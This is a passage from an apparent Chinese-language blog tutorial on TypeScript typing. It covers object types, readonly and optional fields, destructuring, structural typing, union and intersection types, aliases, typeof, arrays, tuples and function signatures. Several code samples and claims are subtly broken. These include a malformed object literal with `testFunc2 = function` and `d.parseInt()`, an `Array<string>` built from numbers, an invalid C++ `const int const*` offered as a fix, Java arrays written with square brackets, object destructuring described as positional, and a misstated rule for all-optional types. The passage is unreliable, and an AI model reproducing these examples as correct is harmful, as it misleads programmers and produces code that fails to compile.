class="built_in">string</span>;</span><br><span class="line">    <span class="title function_">testFunc1</span>(<span class="attr">a</span>: <span class="built_in">number</span>, <span class="attr">b</span>: <span class="built_in">boolean</span>): <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">testFunc2</span>: <span class="function">(<span class="params">c: <span class="built_in">string</span>, d: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">boolean</span>;    <span class="comment">// 箭头函数式声明</span></span><br><span class="line">&#125; = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">    <span class="title function_">testFunc1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (b ? a.<span class="title function_">toString</span>() : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    testFunc2 = <span class="keyword">function</span>(<span class="params">c, d</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> c === d.<span class="built_in">parseInt</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-4-2-对象类型的特性"><a href="#3-2-4-2-对象类型的特性" class="headerlink" title="3.2.4.2 对象类型的特性"></a>3.2.4.2 对象类型的特性</h4><p>一旦声明某个对象的对象类型后，赋值一定要分毫不差地按照类型来，否则编译器不会接受，即<u><strong>不允许</strong></u>以下行为：</p><ul><li>增添对象类型中不存在的字段、删除对象类型中已有的字段；</li><li>定义+赋值时，少给一个成员赋值，或者给不存在的成员赋值；</li></ul><p>但是它也允许一些特性以在合理的范围内支持灵活性：</p><ul><li><p>允许数据域添加 可选修饰符 <code>?</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="built_in">string</span>;</span><br><span class="line">  lastName?: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">lastName</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>; <span class="comment">// 注意进行类型缩窄</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>允许数据域添加 只读修饰符 <code>readonly</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Point</span> = &#123;</span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">resident</span>: &#123;<span class="comment">// 只读数据域如果是对象，则允许更改数据域，不允许更改对象引用</span></span><br><span class="line">        <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">        <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只读数据域和普通数据域间传递，与 C 的 <code>const</code> 修饰类型和普通类型的方法一样，不再赘述。</p></li><li><p>允许 <u><strong>数据域索引</strong></u>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">TestObjT</span> = &#123;</span><br><span class="line">    [<span class="attr">property</span>: <span class="built_in">string</span>]: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TestObjT</code> 的含义是，<strong>不管这个对象有多少属性，只要属性名为字符串，且属性值也是字符串，就符合这个类型声明</strong>，比如可以这么定义：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">tobj</span>: <span class="title class_">TestObjT</span> = &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="attr">bar</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="attr">baz</span>: <span class="string">&quot;3&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此外，对象类型的数据域索引中 property 类型允许 <code>string</code>、<code>number</code>、<code>symbol</code>；</p><p>不过这个特性不建议使用，因为对类型的约束过于宽泛。</p></li></ul><h4 id="3-2-4-3-解构赋值-与-对象类型"><a href="#3-2-4-3-解构赋值-与-对象类型" class="headerlink" title="3.2.4.3 解构赋值 与 对象类型"></a>3.2.4.3 解构赋值 与 对象类型</h4><p>和 python 的解构语法类似，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fig, axe = matplotlib.pyplot.subplots()</span><br><span class="line">[a, _] = curStr.split(<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>TypeScript 的解构要求指定 <strong>对象类型</strong>，其实有两种语法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 obj **按序**解构到指定的变量，必须声明成对象的对象类型（type of obj）</span></span><br><span class="line">&lt;qualifiers&gt; &#123;var1, var2, ...&#125;: &lt;type of obj&gt; = obj;</span><br><span class="line">// 自定义解构顺序</span><br><span class="line">&lt;qualifiers&gt; &#123;objProp1: var1, objProp2: var2, ...&#125;: &lt;type of obj&gt; = obj；</span><br></pre></td></tr></table></figure><p>第一种语法很好理解，比如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">  id,</span><br><span class="line">  name,</span><br><span class="line">  price,</span><br><span class="line">&#125;: &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">price</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125; = product;</span><br></pre></td></tr></table></figure><p>但我们发现 “自定义解构顺序” 的写法非常迷惑，因为大括号内的冒号不再指类型，而是指数据域的映射关系，例如很多新手会这么写：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Shape</span> = &#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">height</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="attr">obj</span>: &#123;</span><br><span class="line">    <span class="attr">shape</span>: <span class="title class_">Shape</span>;</span><br><span class="line">    <span class="attr">xpos</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125; = &#123;</span><br><span class="line">    <span class="attr">shape</span>: &#123;<span class="attr">width</span>: <span class="number">1</span>, <span class="attr">height</span>: <span class="number">1</span>&#125;,</span><br><span class="line">    <span class="attr">xpos</span>: <span class="number">0.0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">shape</span>: <span class="title class_">Shape</span>, <span class="attr">xpos</span>: <span class="built_in">number</span>&#125; = obj;</span><br></pre></td></tr></table></figure><p>最后一句话的含义是什么？如果你认为这是第一种语法，按序把 <code>obj</code> 的 <code>shape</code> 和 <code>xpos</code> 属性赋给了外部的 <code>shape</code>、<code>xpos</code> 变量，<strong>那么就大错特错了！</strong></p><p>因为要牢记：<u><strong>解构语法中的冒号不再作为类型尾缀，而是作为数据域映射的含义</strong></u>，在这里，解构语法一旦出现冒号，就一定是第二条语法。</p><p>上面的最后一条语句的真正含义是，<strong>将 <code>obj</code> 的 <code>shape</code> 数据域赋给外围以 “Shape” 为变量名的变量，它的类型名也是 <code>Shape</code>！</strong>（number 同理）</p><h4 id="3-2-4-4-对象类型的结构类型原则（Structual-Typing-Principle）"><a href="#3-2-4-4-对象类型的结构类型原则（Structual-Typing-Principle）" class="headerlink" title="3.2.4.4 对象类型的结构类型原则（Structual Typing Principle）"></a>3.2.4.4 对象类型的结构类型原则（Structual Typing Principle）</h4><p>只要对象 B 满足 对象 A 的结构特征，TypeScript 就认为对象 B 兼容对象 A 的类型，这称为“结构类型”原则（structual typing）。</p><p>例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">A</span>: &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125; = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> <span class="attr">B</span>: &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125; = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对象 B 满足 A 的结构特征，说明 B 的对象类型 <strong>兼容</strong> A 的对象类型，因此 B 可以直接赋给 A，但反过来不行。</p><h4 id="3-2-4-5-对象类型的最小可选属性规则"><a href="#3-2-4-5-对象类型的最小可选属性规则" class="headerlink" title="3.2.4.5 对象类型的最小可选属性规则"></a>3.2.4.5 对象类型的最小可选属性规则</h4><p>如果一个对象类型所有属性都由 可选修饰符 修饰，按语义理解的话，所有对象都会符合这个定义。</p><p>TypeScript 为了防止类型模糊，规定：</p><p>当一个对象类型所有属性都由 可选修饰符 修饰，那么要定义一个该类型的对象，<strong>至少要含有一个可选属性</strong>。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Options</span> = &#123;</span><br><span class="line">    a?: <span class="built_in">number</span>;</span><br><span class="line">    b?: <span class="built_in">number</span>;</span><br><span class="line">    c?: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">obj</span>: <span class="title class_">Options</span> = &#123;</span><br><span class="line">    <span class="attr">d</span>: <span class="number">123</span>, <span class="comment">// TypeError</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">obj2</span>: <span class="title class_">Options</span> = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">1</span>;    <span class="comment">// Correct</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-5-TypeScript-的联合类型-与-交叉类型"><a href="#3-2-5-TypeScript-的联合类型-与-交叉类型" class="headerlink" title="3.2.5 TypeScript 的联合类型 与 交叉类型"></a>3.2.5 TypeScript 的联合类型 与 交叉类型</h3><p>联合类型 <code>var x: A | B</code> 表示 <code>x</code> 既可以是 <code>A</code> 类型，又可以是 <code>B</code> 类型；</p><p>这其实是暂时无法判断类型的最正确的处理方法。</p><p>它仅允许使用二者类型共同的属性或方法，否则编译器会抛出错误。必须使用 <strong>缩窄类型</strong> 才可以针对性地使用属性和方法。</p><p>交叉类型 <code>var y: A &amp; B</code> 表示 <code>x</code> 必须既是 <code>A</code> 类型，又是 <code>B</code> 类型，<strong>最常见用作对象属性的临时合成</strong>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">x</span>: <span class="built_in">number</span> &amp; <span class="built_in">string</span>;    <span class="comment">// 编译器认为无法取得，是 never 类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">obj</span>: &#123; <span class="attr">foo</span>: <span class="built_in">string</span> &#125; &amp; &#123; <span class="attr">bar</span>: <span class="built_in">string</span> &#125;;    <span class="comment">// 具有 foo, bar 两个数据成员的对象类型</span></span><br></pre></td></tr></table></figure><h3 id="3-2-6-TypeScript-类型别名"><a href="#3-2-6-TypeScript-类型别名" class="headerlink" title="3.2.6 TypeScript 类型别名"></a>3.2.6 TypeScript 类型别名</h3><p>TypeScript 中的关键字 <code>type</code>，现在完全可以理解为 C 的 <code>typedef</code>，就是<strong>定义一个类型（值类型、对象类型、联合类型、交叉类型，等等）的别名</strong>，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">TA</span> = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">y</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="title function_">testFunc1</span>(<span class="attr">a</span>: <span class="built_in">number</span>, <span class="attr">b</span>: <span class="built_in">boolean</span>): <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">testFunc2</span>: <span class="function">(<span class="params">c: <span class="built_in">string</span>, d: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">TB</span> = <span class="variable constant_">TA</span> &amp; &#123; <span class="attr">z</span>: <span class="built_in">boolean</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">obj</span>: <span class="variable constant_">TB</span> = &#123;</span><br><span class="line">    <span class="comment">/* Definitions */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><p><strong>别名不允许重名！</strong></p></li><li><p>别名的有效范围是当前的块级作用域（例如定义在大括号内、函数内，在外面就没有效用了）；</p></li><li><p>别名支持使用表达式定义，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">World</span> = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Greeting</span> = <span class="string">`hello <span class="subst">$&#123;World&#125;</span>`</span>;</span><br></pre></td></tr></table></figure></li><li><p>别名是类型相关代码，因此在编译为 JavaScript 后会被完全清除。</p></li></ul><h3 id="3-2-7-TypeScript-typeof-运算符"><a href="#3-2-7-TypeScript-typeof-运算符" class="headerlink" title="3.2.7 TypeScript typeof 运算符"></a>3.2.7 TypeScript <code>typeof</code> 运算符</h3><p>JavaScript 的 <code>typeof</code> 返回的是对应类型的字符串；</p><p>实际上，在 TypeScript 中保留了 JavaScript 的 <code>typeof</code>，又增添了一个新的 <code>typeof</code> 运算符，返回的是 <strong>TypeScript 类型（比如基本类型、值类型、对象类型等等）</strong>，由于是类型，因此这种运算符不能用于值运算，只能放在类型推导中。</p><p>举个例子：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: <span class="keyword">typeof</span> a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> a === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">  b = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个 <code>typeof</code> 是 TypeScript 新增的返回类型的 <code>typeof</code>，只能用于类型推导，参数不能是<strong>表达式</strong>（前面的类型别名可以）。在编译后会被完全清除；</p><p>第二个 <code>typeof</code> 是 JavaScript 原生的 <code>typeof</code>，返回的是字符串，可以用于值运算。</p><h2 id="3-3-TypeScript-中的数组：基本类型和内置引用类型"><a href="#3-3-TypeScript-中的数组：基本类型和内置引用类型" class="headerlink" title="3.3 TypeScript 中的数组：基本类型和内置引用类型"></a>3.3 TypeScript 中的数组：基本类型和内置引用类型</h2><h3 id="3-3-1-定义和使用"><a href="#3-3-1-定义和使用" class="headerlink" title="3.3.1 定义和使用"></a>3.3.1 定义和使用</h3><p>这里和 JavaScript 动态类型语言不像，而是更接近 Java 的静态类型。</p><p><strong>TypeScript 数组所有成员的类型必须相同，但是成员数量是不确定的</strong>，<u>不论是基本类型数组 <code>type[]</code> 还是 内置类型 <code>Array&lt;Type&gt;</code></u>。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">arr</span>: <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>内置类型 Array 被改成了更像 Java 的泛型，方法和 JavaScript 原生都是一样的：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">arr</span>: <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt; = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>和 JavaScript 一样，可以通过修改 <code>length</code> 属性直接增减成员。</p><p>由于长度不定，因此 <strong>TypeScript 的数组越界也不会报错</strong>，只会返回 <code>undefined</code>；</p><p><code>Array</code> 内置类型和 JavaScript 原生用法几乎一致，方法不再赘述。</p><h3 id="3-3-2-只读数组"><a href="#3-3-2-只读数组" class="headerlink" title="3.3.2 只读数组"></a>3.3.2 只读数组</h3><p>不仅是 JavaScript，大多数语言都认为数组及其他形式的对象都是 <strong>可变数据类型</strong>，因此把数组本身定义为 <code>const</code> 是不会阻止数组被修改的。我们以 C++ 为例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>(<span class="type">size_t</span> s): <span class="built_in">arrSize</span>(s), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">int</span>[s] &#123;<span class="number">0</span>&#125;) &#123;&#125;</span><br><span class="line">    ~<span class="built_in">Test</span>() &#123;<span class="keyword">delete</span>[] arr;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">size_t</span> arrSize;</span><br><span class="line">    <span class="type">int</span>* arr;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setter</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> val)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        arr[idx] = val;    <span class="comment">// OK！</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>setter</code> 函数使用 <code>const</code> 修饰，也没能阻止数组被修改。</p><p>为了限制可变数据类型的修改问题，C++ 采用的是常量指针的方法，声明不允许修改：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 上面的 arr 声明改成： */</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> <span class="type">const</span>* arr;</span><br></pre></td></tr></table></figure><p>这样数组就不再可以被修改，上面的 <code>setter</code> 也会让编译器报错。</p><p>那么 TypeScript 是怎么做的？答案是加 <code>readonly</code> 关键字：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">arr</span>: <span class="keyword">readonly</span> <span class="built_in">number</span>[] = [<span class="number">0</span>, <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>这样无论是使用删除、修改、新增数组成员的方法都会报错。我们可以将 <code>readonly number[]</code> 和 <code>number[]</code> 视为两个类型。</p><p>为此，TypeScript 设计了泛型 <code>Readonly&lt;T&gt;</code> 和 <code>ReadonlyArray&lt;T&gt;</code>，效果类似。</p><h3 id="3-3-3-多维数组"><a href="#3-3-3-多维数组" class="headerlink" title="3.3.3 多维数组"></a>3.3.3 多维数组</h3><p>和 Java 定义很像，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">multi</span>: <span class="built_in">number</span>[][] = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><blockquote><p>Java 写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[][] multi = &#123;</span><br><span class="line"> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line"> [<span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// Or</span></span><br><span class="line"><span class="type">int</span>[][] multi = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br></pre></td></tr></table></figure></blockquote><h2 id="3-4-TypeScript-元组"><a href="#3-4-TypeScript-元组" class="headerlink" title="3.4 TypeScript 元组"></a>3.4 TypeScript 元组</h2><p>和 Python 的思想一样，允许在一个组内放入不同类型的数据。</p><p>一般情况下，<strong><u>元组的长度是确定的、每个元素的类型必须明确指定</u>，因此越界访问、不按定义的类型来赋值都会报错</strong>。</p><p>其类型定义的方法和数组不一样：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];    <span class="comment">// 数组</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: [<span class="built_in">number</span>, <span class="built_in">string</span>, <span class="built_in">boolean</span>] = [<span class="number">1</span>, <span class="string">&quot;2&quot;</span>, <span class="literal">true</span>];    <span class="comment">// 元组</span></span><br></pre></td></tr></table></figure><p>有时候不能省略类型定义，特别是只有一个元素的时候，因为可能会被编译器误判为数组：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>];    <span class="comment">// 编译器认为是数组</span></span><br><span class="line"><span class="keyword">var</span> <span class="attr">b</span>: [<span class="built_in">number</span>] = [<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p><strong>不过 “元组长度是确定的”，而不是 “固定的”</strong>，是因为有 2 个例外：</p><ul><li><p>可选类型修饰符 <code>?</code>（<strong>只能位于元组类型列表尾部</strong>）：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: [<span class="built_in">number</span>, <span class="built_in">number</span>?] = [<span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>扩展运算符（又称 REST 运算符），表示不限制数量的同类元素，可以不位于类型列表尾部，在一个类型声明中只能使用一次：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> t1 = [<span class="built_in">string</span>, <span class="built_in">number</span>, ...<span class="built_in">boolean</span>[]];    <span class="comment">// 注意，这不是数组。数组请用 ...&lt;T&gt;[][]</span></span><br><span class="line"><span class="keyword">type</span> t2 = [<span class="built_in">string</span>, ...<span class="built_in">boolean</span>[], <span class="built_in">number</span>];</span><br><span class="line"><span class="keyword">type</span> t3 = [...<span class="built_in">boolean</span>[], <span class="built_in">string</span>, <span class="built_in">number</span>];</span><br></pre></td></tr></table></figure></li></ul><p>如果没有使用扩展运算符，那么元组的长度就能确定，<strong>可以使用 <code>length</code> 进行长度推断</strong>：</p><p>如果使用了扩展运算符，<code>length</code> 推断就会被看作数组。</p><h2 id="3-5-TypeScript-函数"><a href="#3-5-TypeScript-函数" class="headerlink" title="3.5 TypeScript 函数"></a>3.5 TypeScript 函数</h2><h3 id="3-5-1-定义与使用"><a href="#3-5-1-定义与使用" class="headerlink" title="3.5.1 定义与使用"></a>3.5.1 定义与使用</h3><p>定义方法和 JavaScript 一样，但是类型声明是有讲究的。</p><p>普通定义方法这么加类型声明：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hello</span>(<span class="params">txt: <span class="built_in">string</span></span>): <span class="built_in">void</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p>赋值函数表达式这么加：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">hello</span>: <span class="function">(<span class="params">txt: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span> = <span class="keyword">function</span>(<span class="params">txt</span>) &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="comment">// Or</span></span><br><span class="line"><span class="keyword">var</span> hello = <span class="keyword">function</span>(<span class="params">txt: <span class="built_in">string</span></span>): <span class="built_in">void</span> &#123; <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure><blockquote><p>技巧：想要套用其他函数的签名，就用 <code>typeof</code> 运算符，如下</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">myAdd</span>: <span class="keyword">typeof</span> add = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote><p>箭头函数这么加：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = (<span class="attr">txt</span>: <span class="built_in">string</span>): <span class="function"><span class="params">void</span> =&gt;</span> &#123; <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure><p>由于函数也是一个对象，所以我们可以这么自定义函数的类型（在想要给函数加属性的时候有用）：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span 